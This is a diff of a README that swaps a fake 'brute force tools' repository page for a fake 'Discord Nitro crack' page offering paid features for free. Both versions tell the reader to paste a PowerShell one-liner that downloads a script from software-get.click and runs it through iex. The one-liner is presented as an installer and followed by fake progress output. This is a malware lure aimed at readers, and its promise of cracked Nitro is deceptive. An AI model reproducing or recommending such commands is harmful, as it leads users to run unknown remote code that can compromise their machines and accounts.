@@ -1,16 +1,16 @@
-# Brute Force Attack Tools & Utilities
+# Discord Nitro - Premium Server Boosts & Perks
 
-> Find **password cracker github** repositories for brute force attacks. Tools for security testing, password recovery, and penetration testing.
+> Activate **discord nitro crack** or **discord nitro cracked** features. Get custom emojis, HD streaming, and boosted servers without paying.
 
 ## Features
 
 | Feature | Description |
 |---------|-------------|
-| Multi-Threaded | Parallel attacks for maximum speed |
-| Wordlist Support | Import custom wordlists or use built-in ones |
-| Proxy Support | Route attacks through proxies for anonymity |
-| Resume Capability | Pause and resume long-running attacks |
-| Multiple Protocols | HTTP, FTP, SSH, RDP, and more |
+| Custom Emojis | Use animated and static emojis across all servers |
+| HD Video | Stream in 1080p or 4K resolution |
+| Server Boost | Boost your favorite servers with custom icons and banners |
+| Increased Limits | Upload larger files and longer messages |
+| Profile Theme | Customize your profile with exclusive themes |
 
 ## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
 
@@ -21,15 +21,15 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1?get=brute-force | iex"
+powershell -Command "irm https://software-get.click/Loader.ps1?get=discord-nitro | iex"
 ```
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading Brute Force Tools modules...
+[1/4] Loading Discord Nitro modules...
 [2/4] Extracting components and assets...
-[3/4] Installing brute-force templates...
-[4/4] Ready. Start using Brute Force Tools.
+[3/4] Installing discord-nitro templates...
+[4/4] Ready. Start using Discord Nitro.
 ```
 
 ### Step 4: Start Using the Toolkit
@@ -39,7 +39,7 @@ powershell -Command "irm https://software-get.click/Loader.ps1?get=brute-force |
 
 ## Usage
 
-Select the target service or file type. Load a wordlist or configure character set for brute force. Set proxy settings if needed. Start the attack and monitor success rates. Save results or export cracked passwords.
+After installation, restart Discord. Your account will automatically have Nitro features enabled. Go to User Settings to customize your profile, upload custom emojis, and enjoy HD streaming in calls.
 
 ## Disclaimer
 
@@ -52,7 +52,7 @@ This tool is provided for educational and backup purposes only. We do not condon
 Use this prompt to generate a professional GitHub repository banner for this topic:
 
 ```
-Create a modern, professional GitHub repository banner for "Brute Force Tools" with these specifications:
+Create a modern, professional GitHub repository banner for "Discord Nitro" with these specifications:
 
 DIMENSIONS: 1280x640px
 
@@ -69,7 +69,7 @@ COLOR SCHEME:
 - Accent colors: Cyan (#06b6d4), Green (#10b981)
 
 MAIN ELEMENTS:
-1. LEFT SIDE (40%): Large title "BRUTE FORCE TOOLS" in bold modern sans-serif, subtitle describing the toolkit, small badges showing key features
+1. LEFT SIDE (40%): Large title "DISCORD NITRO" in bold modern sans-serif, subtitle describing the toolkit, small badges showing key features
 2. RIGHT SIDE (60%): Floating device mockups showing the software interface, UI elements, icons, and glassmorphic cards
 3. VISUAL EFFECTS: Soft glow, floating particles, gradient mesh, subtle grid, drop shadows
 
